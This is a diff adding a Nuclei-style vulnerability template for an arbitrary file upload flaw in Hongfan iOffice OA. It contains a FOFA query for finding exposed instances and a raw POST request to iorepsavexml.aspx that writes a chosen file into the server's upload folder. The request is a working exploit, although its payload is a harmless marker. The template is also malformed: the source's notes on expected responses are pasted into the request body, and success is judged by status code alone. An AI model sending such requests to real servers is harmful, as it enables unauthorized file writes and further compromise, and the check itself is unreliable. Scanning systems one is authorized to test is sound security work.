@@ -1,0 +1,48 @@
+id: poc-uzc1cmwsg9t8spn7
+info:
+  name: 红帆OA iorepsavexml 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uzc1cmwsg9t8spn7'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uzc1cmwsg9t8spn7
+    fofa: app="红帆-ioffice"
+http:
+- raw:
+  - 'POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=dudesuite.txt&filepath=/upfiles/rep/pic/ HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+
+
+
+    dudesuite
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /iOffice/upfiles/rep/pic/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
